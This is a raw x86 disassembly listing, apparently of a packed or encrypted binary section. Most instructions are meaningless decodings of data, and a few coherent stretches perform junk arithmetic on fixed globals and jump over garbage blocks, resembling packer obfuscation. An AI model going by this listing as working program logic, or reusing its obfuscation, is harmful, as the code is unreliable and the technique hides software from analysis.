  4085a3:	mov    esp,0x5235f600
  4085a8:	cmp    eax,0x7416f078
  4085ad:	xor    BYTE PTR [eax+0xd7700e5],ah
  4085b3:	jbe    0x4085d8
  4085b5:	push   es
  4085b6:	xor    edx,DWORD PTR [edx+0x25fc2a0a]
  4085bc:	dec    edx
  4085bd:	and    BYTE PTR [eax],ah
  4085bf:	imul   esi
  4085c1:	xchg   edx,eax
  4085c2:	mov    ebp,0x79da5583
  4085c7:	cs out dx,eax
  4085c9:	jae    0x408642
  4085cb:	pop    edi
  4085cc:	mov    bh,0x8a
  4085ce:	add    eax,0x7062c813
  4085d3:	in     al,0x34
  4085d5:	fcmovbe st,st(3)
  4085d7:	jns    0x4085dd
  4085d9:	push   ebx
  4085da:	push   edi
  4085db:	and    DWORD PTR [esi],esi
  4085dd:	adc    eax,DWORD PTR [esi-0x1]
  4085e0:	dec    edi
  4085e1:	or     bl,0x8
  4085e4:	retf   0x9d98
  4085e7:	xchg   DWORD PTR cs:[eax-0x47],ebx
  4085eb:	mov    al,0xcf
  4085ed:	in     al,0x8a
  4085ef:	jns    0x40857c
  4085f1:	or     al,0xe4
  4085f3:	push   0xfffffffc
  4085f5:	lods   al,BYTE PTR ds:[esi]
  4085f6:	push   edi
  4085f7:	pusha  
  4085f8:	mov    ecx,0x1d7153e7
  4085fd:	inc    esp
  4085fe:	scas   eax,DWORD PTR es:[edi]
  4085ff:	inc    ebx
  408600:	push   ebx
  408601:	rol    DWORD PTR [ebp-0x44883898],1
  408607:	or     DWORD PTR [edi+0x13],edi
  40860a:	dec    ebp
  40860b:	push   0x7f
  40860d:	lds    esi,FWORD PTR [ebx+0x525d8a83]
  408613:	rcl    BYTE PTR ds:0x5b360a90,0x4c
  40861a:	cld    
  40861b:	arpl   di,bx
  40861d:	sbb    dl,BYTE PTR [ecx-0x485bc037]
  408623:	mov    ds:0xfdba4dbc,al
  408628:	dec    edi
  408629:	clc    
  40862a:	xchg   esi,eax
  40862b:	or     dh,BYTE PTR [edx+0xd]
  40862e:	mov    eax,ds:0x60469bdc
  408633:	pop    esi
  408634:	jo     0x408668
  408636:	xor    dl,BYTE PTR [ebp+0x3]
  408639:	or     BYTE PTR [ecx+0x78],dh
  40863c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40863d:	test   DWORD PTR [ecx+eax*1-0x38],ebp
  408641:	or     bl,BYTE PTR [eax-0x6d]
  408644:	cwde   
  408645:	inc    eax
  408646:	hlt    
  408647:	stc    
  408648:	je     0x408695
  40864a:	mov    eax,ds:0x1b724ad4
  40864f:	neg    DWORD PTR [esi]
  408651:	(bad)  
  408652:	sbb    eax,0x19375b6
  408657:	pop    edi
  408658:	xor    eax,0xcb43a1f
  40865d:	sub    dh,dh
  40865f:	dec    ebx
  408660:	inc    edi
  408661:	pop    es
  408662:	mov    ebp,0x44c86df
  408667:	cmp    DWORD PTR [edi+0x40],esi
  40866a:	(bad)
  40866e:	adc    al,0xdb
  408670:	push   0x796e33e5
  408675:	or     DWORD PTR [ecx+0x7b],ecx
  408678:	push   ss
  408679:	pop    edx
  40867a:	dec    ebp
  40867b:	jmp    0x18bbf51a
  408680:	std    
  408681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408682:	out    dx,eax
  408683:	ja     0x408615
  408685:	scas   eax,DWORD PTR es:[edi]
  408686:	mov    es,WORD PTR [ebp+0x10]
  408689:	jge    0x408661
  40868b:	jmp    0x408640
  40868d:	push   esi
  40868e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40868f:	pop    ecx
  408690:	fcmovu st,st(7)
  408692:	sbb    ecx,DWORD PTR [esi-0x5b3b3572]
  408698:	jge    0x408689
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x4337e3,0x43377b
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x43386f,0x4338a7
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x262d194a],ecx
  4086ca:	sbb    ecx,DWORD PTR [edx+0x247e7ed6]
  4086d0:	jl     0x408750
  4086d2:	jle    0x40870b
  4086d4:	jmp    0x33f0213e
  4086d9:	inc    edi
  4086da:	fstp   TBYTE PTR [eax+0x1d0ebe74]
  4086e0:	dec    eax
  4086e1:	out    0xc2,al
  4086e3:	in     eax,0x9d
  4086e5:	jmp    0x40868e
  4086e7:	push   eax
  4086e8:	dec    edx
  4086e9:	call   0x5675f985
  4086ee:	aas    
  4086ef:	(bad)  
  4086f1:	jb     0x408694
  4086f3:	sbb    eax,0x27de384c
  4086f8:	pushf  
  4086f9:	test   eax,0x7b596407
  4086fe:	xor    esi,DWORD PTR [esi+0x6a]
  408701:	sub    eax,0xcde4cea
  408706:	jmp    0xcca8174c
  40870b:	adc    eax,0x5d96ba42
  408710:	sbb    eax,0x67e9574a
  408715:	xchg   esp,eax
  408716:	sub    DWORD PTR [eax+0x1f996866],ecx
  40871c:	cs push ecx
  40871e:	enter  0xe757,0x64
  408722:	cwde   
  408723:	jmp    FWORD PTR [edi+0x60]
  408726:	loop   0x4086d5
  408728:	and    edi,DWORD PTR [edx+0x209eaec9]
  40872e:	mov    bh,0x7
  408730:	ja     0x408774
  408732:	sbb    ebx,DWORD PTR [edx]
  408734:	jns    0x408713
  408736:	add    eax,0x4f7da665
  40873b:	sub    ah,BYTE PTR [edx-0x4b14942]
  408741:	xchg   dh,dl
  408743:	mov    bl,0xed
  408745:	ret    
  408746:	dec    edi
  408747:	clc    
  408748:	in     eax,dx
  408749:	cmp    al,BYTE PTR [eax]
  40874b:	xchg   esi,eax
  40874c:	jb     0x408793
  40874e:	ret    
  40874f:	jle    0x4086e7
  408751:	sub    ah,BYTE PTR [eax-0x7e]
  408754:	aas    
  408755:	xor    BYTE PTR [ebp-0x3cf498a9],dh
  40875b:	cdq    
  40875c:	(bad)  
  40875d:	test   DWORD PTR [esi+0x27a8b497],0x4d6ee49a
  408767:	cdq    
  408768:	mov    ch,0x9b
  40876a:	out    dx,eax
  40876b:	dec    ecx
  40876c:	aam    0xc1
  40876e:	jp     0x4087aa
  408770:	adc    DWORD PTR cs:[eax+0x377590ba],0x695f35a
  40877b:	test   eax,0x7b8ac6f1
  408780:	inc    esp
  408781:	test   al,0x60
  408783:	add    BYTE PTR [edx],ah
  408785:	xchg   edx,eax
  408786:	sbb    ch,BYTE PTR [edx]
  408788:	pop    ebx
  408789:	pop    edi
  40878a:	pop    ebp
  40878b:	outs   dx,BYTE PTR ds:[esi]
  40878c:	mov    ebp,0xf6da3185
  408791:	mov    al,ds:0x7cc1c25b
  408796:	sub    esp,DWORD PTR [ecx-0x333f8011]
  40879c:	shl    eax,cl
  40879e:	call   0x12f966f7
  4087a3:	mov    ch,0x4c
  4087a5:	lea    eax,ds:0xa45230c2
  4087ab:	(bad)
  4087af:	out    0xb6,eax
  4087b1:	xchg   edx,eax
  4087b2:	mov    ah,0x39
  4087b4:	pop    ebp
  4087b5:	xchg   ebx,eax
  4087b6:	pop    ebp
  4087b7:	ins    DWORD PTR es:[edi],dx
  4087b8:	add    esp,DWORD PTR [ebx-0x45335fee]
  4087be:	fldenv [ecx]
  4087c0:	inc    esi
  4087c1:	sbb    BYTE PTR [eax+0x52],dl
  4087c4:	cli    
  4087c5:	sbb    DWORD PTR [edi-0x6b],0x1b
  4087c9:	mov    dh,0x4c
  4087cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087cc:	(bad)  
  4087cd:	jns    0x408834
  4087cf:	out    0x43,al
  4087d1:	add    eax,0x3bfb1163
  4087d6:	fmul   DWORD PTR [edi-0x29]
  4087d9:	ins    DWORD PTR es:[edi],dx
  4087da:	(bad)  
  4087db:	in     al,0x43
  4087dd:	es dec edi
  4087df:	out    dx,eax
  4087e0:	dec    esp
  4087e1:	xor    DWORD PTR [esi-0x3c],esp
  4087e4:	sahf   
  4087e5:	pop    edi
  4087e6:	add    DWORD PTR [edi],0x60
  4087e9:	pop    ds
  4087ea:	add    BYTE PTR [esi+0x1b],bl
  4087ed:	adc    DWORD PTR [ecx-0x4bbb8062],ecx
  4087f3:	leave  
  4087f4:	cdq    
  4087f5:	cmovl  ebp,DWORD PTR [ebx-0x72]
  4087f9:	and    DWORD PTR [edi],eax
  4087fb:	mov    cl,0x52
  4087fd:	inc    ecx
  4087fe:	jmp    0x875f5bd0
  408803:	jns    0x408874
  408805:	call   0xed32:0xa0b72a85
  40880c:	fidiv  WORD PTR [ebp-0x50]
  40880f:	idiv   BYTE PTR [eax+eax*4+0x30]
  408813:	mov    bl,0x98
  408815:	call   0xc9190083
  40881a:	adc    edi,0x1f20ad83
  408820:	xchg   edx,eax
  408821:	cld    
  408822:	mov    bh,0xe1
  408824:	test   BYTE PTR [edi+0x61b5c3af],0x7a
  40882b:	cld    
  40882c:	mov    cs,WORD PTR [esi+0x21b4eeb6]
  408832:	sub    DWORD PTR [esi-0x77],ebp
  408835:	xchg   edx,eax
  408836:	push   ebp
  408837:	pushf  
  408838:	(bad)  
  40883a:	xchg   esp,eax
  40883b:	pusha  
  40883c:	sbb    al,0x69
  40883e:	mov    ebx,0x3067249f
  408843:	push   0x47
  408845:	repnz outs dx,DWORD PTR ds:[esi]
  408847:	test   DWORD PTR ds:0x406f0655,ecx
  40884d:	push   ebx
  40884e:	jp     0x408810
  408850:	ror    ecx,1
  408852:	inc    eax
  408853:	sbb    ah,BYTE PTR ds:0x6c8ea590
  408859:	cmp    esp,0x3b39bc45
  40885f:	mov    WORD PTR [ecx-0x4a],cs
  408862:	loopne 0x4088a2
  408864:	nop
  408865:	(bad)  
  408866:	push   cs
  408867:	aaa    
  408868:	fcom   QWORD PTR [edx+0x4c5371f7]
  40886e:	mov    eax,ds:0xc47858e4
  408873:	jl     0x40888c
  408875:	adc    ebp,DWORD PTR [eax-0x56e58108]
  40887b:	push   ss
  40887c:	mov    cl,0x71
  40887e:	mov    ds:0xab7274ff,al
  408883:	mov    al,ds:0x82789b52
  408888:	push   0xa7e675b2
  40888d:	and    ah,bl
  40888f:	xchg   esi,eax
  408890:	jp     0x40888e
  408892:	(bad)  
  408893:	nop
  408894:	xchg   edi,eax
  408895:	cmp    eax,0x1a1b454a
  40889a:	or     al,0x5
  40889c:	retw   
  40889e:	(bad)  
  4088a1:	or     BYTE PTR ds:0x7488ef1e,bl
  4088a7:	add    cl,dh
  4088a9:	cli    
  4088aa:	xchg   edx,eax
  4088ab:	cmp    edi,DWORD PTR [ebx]
  4088ad:	fldcw  WORD PTR [eax]
  4088af:	sahf   
  4088b0:	push   esi
  4088b1:	lock xchg ecx,eax
  4088b3:	daa    
  4088b4:	sub    al,0x66
  4088b6:	sbb    al,bl
  4088b8:	sbb    al,BYTE PTR [ebx+0x12632791]
  4088be:	popa   
  4088bf:	mov    edx,0xf9a053f
  4088c4:	push   esi
  4088c5:	xor    BYTE PTR [ebx],al
  4088c7:	push   ds
  4088c8:	arpl   WORD PTR [esi+eiz*8-0x8],bx
  4088cc:	sbb    DWORD PTR [esi],esi
  4088ce:	mov    ch,0x78
  4088d0:	rcl    DWORD PTR [edx],cl
  4088d2:	jg     0x40890b
  4088d4:	call   0x27a9b428
  4088d9:	add    BYTE PTR [eax],bh
  4088db:	jne    0x4088ef
  4088dd:	in     eax,0xe4
  4088df:	hlt    
  4088e0:	push   eax
  4088e1:	test   DWORD PTR [esp+edi*1-0x347ca0c6],ebp
  4088e8:	mov    esp,0x9aa96e17
  4088ed:	out    0xc4,eax
  4088ef:	popa   
  4088f0:	mov    al,ds:0xed304508
  4088f5:	jecxz  0x4088ef
  4088f7:	push   eax
  4088f8:	xlat   BYTE PTR ds:[ebx]
  4088f9:	fist   DWORD PTR [esi]
  4088fb:	pop    ss
  4088fc:	sahf   
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x4337e3,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x43385b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4337d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43379f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4338a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xf82a762c
  408968:	xchg   edi,eax
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	xchg   ch,ah
  408973:	or     bh,ah
  408975:	imul   BYTE PTR ds:0x5c4a2a02
  40897b:	loopne 0x4089f6
  40897d:	and    eax,0x640d3622
  408982:	stos   BYTE PTR es:[edi],al
  408983:	or     bl,BYTE PTR [edx+edi*2+0x217b67de]
  40898a:	gs pop ebp
  40898c:	les    ebp,FWORD PTR [edx]
  40898e:	jno    0x4089db
  408990:	ins    BYTE PTR es:[edi],dx
  408991:	out    dx,al
  408992:	test   eax,0x4c11706
  408997:	and    dl,BYTE PTR [ebp-0xfccca8]
  40899d:	cmp    BYTE PTR [ecx+0x73],ch
  4089a0:	scas   eax,DWORD PTR es:[edi]
  4089a1:	cwde   
  4089a2:	push   ecx
  4089a3:	jmp    0xe6c2:0xe5a59895
  4089aa:	scas   eax,DWORD PTR es:[edi]
  4089ab:	ret    
  4089ac:	jno    0x4089fa
  4089ae:	repz aam 0x92
  4089b1:	xor    BYTE PTR [edx],dh
  4089b3:	jmp    0x8139:0x1dc777f0
  4089ba:	mov    BYTE PTR [edi-0x31],dh
  4089bd:	xchg   esi,eax
  4089be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089bf:	push   ebp
  4089c0:	pushf  
  4089c1:	inc    eax
  4089c2:	pop    ebp
  4089c3:	pop    ecx
  4089c4:	add    esi,esp
  4089c6:	push   ebx
  4089c7:	arpl   WORD PTR [eax],ax
  4089c9:	push   ebp
  4089ca:	stos   BYTE PTR es:[edi],al
  4089cb:	leave  
  4089cc:	or     eax,0xd51f9c09
  4089d1:	xor    al,BYTE PTR [edx]
  4089d3:	xchg   DWORD PTR [ebp+0x29],edx
  4089d6:	cdq    
  4089d7:	cmp    dh,ah
  4089d9:	pop    ds
  4089da:	(bad)  
  4089db:	test   al,0xa3
  4089dd:	inc    edx
  4089de:	sbb    edx,DWORD PTR [edi]
  4089e0:	int3   
  4089e1:	out    dx,al
  4089e2:	std    
  4089e3:	data16 mov dl,0xad
  4089e6:	dec    esp
  4089e7:	call   0x2f4:0xbc35fb57
  4089ee:	retf   
  4089ef:	int3   
  4089f0:	cmp    esp,esi
  4089f2:	(bad)  
  4089f3:	xchg   edi,eax
  4089f4:	sbb    edx,DWORD PTR [eax-0x2725bee6]
  4089fa:	loope  0x408a2f
  4089fc:	jae    0x408a16
  4089fe:	fbld   TBYTE PTR [esi+0x66]
  408a01:	call   0xa5cf:0xd1ff80da
  408a08:	in     al,dx
  408a09:	ror    DWORD PTR [ebp+edi*2-0x1511126],cl
  408a10:	imul   eax,DWORD PTR [ebx+0xe],0xffffffc7
  408a14:	and    eax,0xadecb0fa
  408a19:	call   DWORD PTR [edi-0x7975320e]
  408a1f:	or     al,0x56
  408a21:	stos   DWORD PTR es:[edi],eax
  408a22:	adc    al,0x10
  408a24:	dec    bp
  408a26:	mov    ecx,0xe2ca15b9
  408a2b:	push   ebx
  408a2c:	je     0x408a16
  408a2e:	mov    bh,0x51
  408a30:	ja     0x4089da
  408a32:	cmp    dh,BYTE PTR [eax-0x612d73cf]
  408a38:	lea    edi,[esi-0x19]
  408a3b:	inc    edi
  408a3c:	cmc    
  408a3d:	or     ebp,edx
  408a3f:	sub    BYTE PTR [ebp-0x5af5502e],ch
  408a45:	dec    edx
  408a46:	jp     0x4089e0
  408a48:	mov    eax,cs:0x92fc2798
  408a4e:	sub    esi,DWORD PTR [eax]
  408a50:	mov    WORD PTR [ecx+0x5ff52941],gs
  408a56:	mov    bh,ch
  408a58:	loope  0x408ab4
  408a5a:	lock add edx,DWORD PTR [esi+0x2ce396f5]
  408a61:	lock mov al,0x12
  408a64:	ret    
  408a65:	mov    DWORD PTR [edx+0x2d],ecx
  408a68:	inc    esp
  408a69:	imul   eax,ecx,0x21085500
  408a6f:	or     eax,0xefe34141
  408a74:	pop    ecx
  408a75:	mov    al,0x62
  408a77:	mov    bh,0xe9
  408a79:	push   ds
  408a7a:	pop    eax
  408a7b:	mov    esp,DWORD PTR [ecx+0x73cfb8a]
  408a81:	xchg   ecx,eax
  408a82:	jo     0x408a58
  408a84:	inc    esi
  408a85:	jmp    0xdc2b:0xc5214fd8
  408a8c:	(bad)
  408a8f:	test   eax,0x29bd6364
  408a94:	jmp    0x19606071
  408a99:	fimul  WORD PTR [ebx+0xb1e1ffe]
  408a9f:	mov    esi,0x996f0f95
  408aa4:	cmp    eax,0xff18ec1
  408aa9:	xor    bl,cl
  408aab:	out    dx,eax
  408aac:	fdiv   QWORD PTR [eax-0x75]
  408aaf:	xlat   BYTE PTR ds:[ebx]
  408ab0:	out    dx,eax
  408ab1:	loopne 0x408a9a
  408ab3:	cmp    dh,BYTE PTR [eax-0x2d]
  408ab6:	mov    ch,0x49
  408ab8:	mov    edx,0x98f19d08
  408abd:	cmp    eax,0x3b4fe41a
  408ac2:	add    cl,BYTE PTR [eax+ebp*2+0x6f25fe54]
  408ac9:	ja     0x408acf
  408acb:	xchg   edx,eax
  408acc:	adc    BYTE PTR [ecx],0x9a
  408acf:	inc    esp
  408ad0:	mov    ah,0x39
  408ad2:	push   ecx
  408ad3:	call   0x28b7:0xdcd07d29
  408ada:	imul   eax,DWORD PTR [esi-0x53105afb],0x7355c731
  408ae4:	pop    ds
  408ae5:	iret   
  408ae6:	call   0xab382126
  408aeb:	test   DWORD PTR [ecx+0x65],edx
  408aee:	dec    edx
  408aef:	cdq    
  408af0:	xor    al,0xff
  408af2:	rol    DWORD PTR [ebx+0x65],1
  408af5:	cmp    eax,0xa4918ee9
  408afa:	mov    bl,0x7d
  408afc:	out    dx,eax
  408afd:	add    DWORD PTR [ebp+0x61082324],edi
  408b03:	aaa    
  408b04:	cmp    al,BYTE PTR [edi]
  408b06:	mov    dh,0x8f
  408b08:	fistp  QWORD PTR [ebx+edx*4+0x67]
  408b0c:	mov    eax,0x12770111
  408b11:	or     DWORD PTR cs:[ebx+0x5d],esi
  408b15:	xchg   edx,eax
  408b16:	add    eax,0xfc93641a
  408b1b:	inc    edi
  408b1c:	sbb    ebx,DWORD PTR [edi]
  408b1e:	xor    al,0x93
  408b20:	adc    DWORD PTR [eax+0x71],esi
  408b23:	pushf  
  408b24:	xchg   ecx,eax
  408b25:	xor    ecx,DWORD PTR [esi+edi*4]
  408b28:	mov    ecx,0x3ad7acab
  408b2d:	add    DWORD PTR [ebx-0x26],0xee155340
  408b34:	cdq    
  408b35:	ds and eax,0x86d157df
  408b3b:	(bad)  
  408b3d:	jecxz  0x408b36
  408b3f:	ds mov ch,0x18
  408b42:	movhpd QWORD PTR [edi-0x867f14],xmm0
  408b4a:	or     bl,BYTE PTR [edi+eax*8-0x1e314cd2]
  408b51:	imul   ebp,DWORD PTR [ebp-0x37],0x58
  408b55:	xchg   esi,eax
  408b56:	pushf  
  408b57:	daa    
  408b58:	iret   
  408b59:	xor    esp,DWORD PTR [ecx-0x680e900a]
  408b5f:	push   ds
  408b60:	sbb    eax,0x38bf37e8
  408b65:	mov    al,0xde
  408b67:	fistp  DWORD PTR [edx+0x4d]
  408b6a:	cdq    
  408b6b:	call   0x6597:0xfe94341a
  408b72:	call   0x994d543c
  408b77:	adc    eax,0x362c6220
  408b7c:	push   ss
  408b7d:	xchg   esp,eax
  408b7e:	popa   
  408b7f:	push   ss
  408b80:	jbe    0x408b15
  408b82:	mov    bl,0x90
  408b84:	outs   dx,BYTE PTR ds:[esi]
  408b85:	test   DWORD PTR [edx+0x489a62b7],esi
  408b8b:	cmp    al,BYTE PTR [edx]
  408b8d:	pushf  
  408b8e:	mov    edi,0x1d60c19f
  408b93:	and    dh,BYTE PTR [edx+ebx*1-0x168f08db]
  408b9a:	add    DWORD PTR [edi],ecx
  408b9c:	test   DWORD PTR ds:0x8b000000,ebx
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	inc    edi
  408bf1:	adc    dl,BYTE PTR [edi]
  408bf3:	dec    eax
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	add    al,BYTE PTR [ebx+eax*2-0x1b]
  408c00:	or     al,ch
  408c02:	cld    
  408c03:	neg    BYTE PTR [ecx-0x63]
  408c06:	imul   ecx,DWORD PTR [edi],0x8e659237
  408c0c:	sbb    DWORD PTR gs:[eax+0x56],edx
  408c10:	das    
  408c11:	cmp    edx,edx
  408c13:	in     eax,dx
  408c14:	cmp    al,0x1c
  408c16:	jno    0x408bbe
  408c18:	pop    ebx
  408c19:	dec    edx
  408c1a:	aad    0x71
  408c1c:	pop    esp
  408c1d:	pop    eax
  408c1e:	lods   al,BYTE PTR ds:[esi]
  408c1f:	mov    bh,0xf7
  408c21:	adc    ecx,ebx
  408c23:	in     eax,dx
  408c24:	dec    esp
  408c25:	add    DWORD PTR [edi+0x67e331f],ebp
  408c2b:	jp     0x408ca6
  408c2d:	daa    
  408c2e:	and    DWORD PTR [ecx+0x3653224f],ebp
  408c34:	dec    esi
  408c35:	das    
  408c36:	sub    BYTE PTR [esi+0x7b],al
  408c39:	jp     0x408bfd
  408c3b:	nop
  408c3c:	mov    ah,al
  408c3e:	mov    dl,0x3a
  408c40:	pusha  
  408c41:	and    BYTE PTR [ebp+0x53],0x97
  408c45:	leave  
  408c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c47:	fdivr  QWORD PTR [edx-0x2f]
  408c4a:	clc    
  408c4b:	sti    
  408c4c:	dec    eax
  408c4d:	jle    0x408c2a
  408c4f:	mov    dl,0x8d
  408c51:	xchg   DWORD PTR [eax],ebx
  408c53:	push   0x463cad65
  408c58:	cli    
  408c59:	inc    edx
  408c5a:	(bad)  
  408c5b:	mov    dh,0x4a
  408c5d:	and    ah,BYTE PTR [ecx-0x7e]
  408c60:	fstp   DWORD PTR [esi]
  408c62:	adc    al,BYTE PTR [esi-0x2f]
  408c65:	(bad)  
  408c66:	and    bh,BYTE PTR [eax-0x742a2a79]
  408c6c:	jg     0x408ca5
  408c6e:	pop    esp
  408c6f:	pop    ss
  408c70:	jae    0x408c12
  408c72:	retf   
  408c73:	nop
  408c74:	aam    0x53
  408c76:	mov    al,0x2e
  408c78:	bound  ebp,QWORD PTR [esi-0x1619557c]
  408c7e:	jmp    0x9d1c7092
  408c83:	mov    esp,0x7fac9db0
  408c88:	add    DWORD PTR [esi],ebp
  408c8a:	sahf   
  408c8b:	mov    es,ecx
  408c8d:	inc    ebx
  408c8e:	(bad)  [edi+edi*4+0x55]
  408c92:	mov    ?,WORD PTR [esp+ecx*4-0x7d]
  408c96:	ins    DWORD PTR es:[edi],dx
  408c97:	rcl    BYTE PTR [ebp-0x1483a1b5],0xd8
  408c9e:	dec    ebx
  408c9f:	shl    cl,1
  408ca1:	popf   
  408ca2:	or     ebx,DWORD PTR [ecx-0x5]
  408ca5:	aam    0x33
  408ca7:	into   
  408ca8:	fsubr  DWORD PTR [edx]
  408caa:	push   ebp
  408cab:	addr16 out 0xbd,eax
  408cae:	add    eax,0x29d88652
  408cb3:	inc    esi
  408cb4:	push   esi
  408cb5:	arpl   dx,dx
  408cb7:	jmp    0xf1cd76f0
  408cbc:	pop    esi
  408cbd:	fild   WORD PTR cs:[ebp-0x7cb90b71]
  408cc4:	xchg   esp,eax
  408cc5:	pop    esp
  408cc6:	cmp    BYTE PTR [edx-0x3e],ch
  408cc9:	repz dec edi
  408ccb:	xor    DWORD PTR [esi-0x59],0x9a1298a6
  408cd2:	xchg   DWORD PTR [esi],esi
  408cd4:	std    
  408cd5:	push   esp
  408cd6:	add    ch,BYTE PTR [eax+eax*8+0x6a4c42d8]
  408cdd:	(bad)  
  408cde:	mov    cl,0x3d
  408ce0:	leave  
  408ce1:	jl     0x408c81
  408ce3:	mov    ds:0x5cd25964,eax
  408ce8:	fcomp  QWORD PTR [esi]
  408cea:	lea    ecx,[ecx+0x58]
  408ced:	mov    edi,DWORD PTR [ebx+esi*8+0xb]
  408cf1:	pop    eax
  408cf2:	or     DWORD PTR [ecx],ecx
  408cf4:	mov    eax,ds:0xa64931be
  408cf9:	cld    
  408cfa:	ret    
  408cfb:	push   es
  408cfc:	push   ss
  408cfd:	retf   
  408cfe:	sti    
  408cff:	pop    ss
  408d00:	lock or DWORD PTR [edx],0xfffffff7
  408d04:	call   0x6c517d02
  408d09:	daa    
  408d0a:	or     al,BYTE PTR [ecx+eax*2+0x426d0a4e]
  408d11:	scas   eax,DWORD PTR es:[edi]
  408d12:	repnz push ebx
  408d14:	aad    0x18
  408d16:	push   esi
  408d17:	sub    edi,DWORD PTR [edx-0x60]
  408d1a:	add    al,0x18
  408d1c:	jo     0x408cb8
  408d1e:	dec    esp
  408d1f:	dec    ecx
  408d20:	lahf   
  408d21:	imul   eax,DWORD PTR [ecx-0x12]
  408d25:	jae    0x408d03
  408d27:	and    dh,bl
  408d29:	xor    eax,0x14908b27
  408d2e:	mov    WORD PTR [ebp-0x45],ds
  408d31:	and    ch,dh
  408d33:	lea    esi,[ebp-0x69722958]
  408d39:	pushf  
  408d3a:	into   
  408d3b:	xor    ebp,DWORD PTR [edx-0x725804e4]
  408d41:	scas   al,BYTE PTR es:[edi]
  408d42:	in     eax,0x76
  408d44:	pusha  
  408d45:	lods   al,BYTE PTR ds:[esi]
  408d46:	inc    edx
  408d47:	mov    al,0xbe
  408d49:	in     eax,0xcf
  408d4b:	call   0x168b:0xf0374e0
  408d52:	int3   
  408d53:	aaa    
  408d54:	stos   BYTE PTR es:[edi],al
  408d55:	in     al,dx
  408d56:	pop    ebx
  408d57:	cwde   
  408d58:	popa   
  408d59:	repnz xchg dh,dh
  408d5c:	jle    0x408dd8
  408d5e:	mov    ebx,0xd740d67d
  408d63:	sbb    al,0x89
  408d65:	jae    0x408d94
  408d67:	rol    BYTE PTR gs:[esi],0xbd
  408d6b:	pop    edx
  408d6c:	lods   al,BYTE PTR ds:[esi]
  408d6d:	adc    al,0xc
  408d6f:	inc    ebp
  408d70:	sub    DWORD PTR fs:[eax],edx
  408d73:	mov    eax,DWORD PTR [edi]
  408d75:	sub    DWORD PTR [edx-0xb],0x12
  408d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d7a:	fs shl ebp,0x33
  408d7e:	mov    edx,0xc107ed26
  408d83:	nop
  408d84:	or     al,0xb6
  408d86:	jecxz  0x408de9
  408d88:	cmp    DWORD PTR [edx-0x5a62516b],esi
  408d8e:	xchg   edx,eax
  408d8f:	test   eax,0x96480163
  408d94:	stos   BYTE PTR es:[edi],al
  408d95:	adc    BYTE PTR [edi],dl
  408d97:	jno    0x408e07
  408d99:	(bad)  
  408d9a:	hlt    
  408d9b:	dec    esi
  408d9c:	call   0x98ed:0x4cfb986d
  408da3:	out    dx,eax
  408da4:	aad    0x71
  408da6:	loopne 0x408df0
  408da8:	dec    ecx
  408da9:	adc    al,0x52
  408dab:	sti    
  408dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dad:	adc    BYTE PTR [edx+0x52],0x74
  408db1:	stc    
  408db2:	xor    ah,bh
  408db4:	in     eax,0xf9
  408db6:	mov    bl,0xef
  408db8:	xor    eax,0xe0997a7e
  408dbd:	fisttp QWORD PTR [edx]
  408dbf:	packssdw mm3,QWORD PTR [edi-0x2b796d5c]
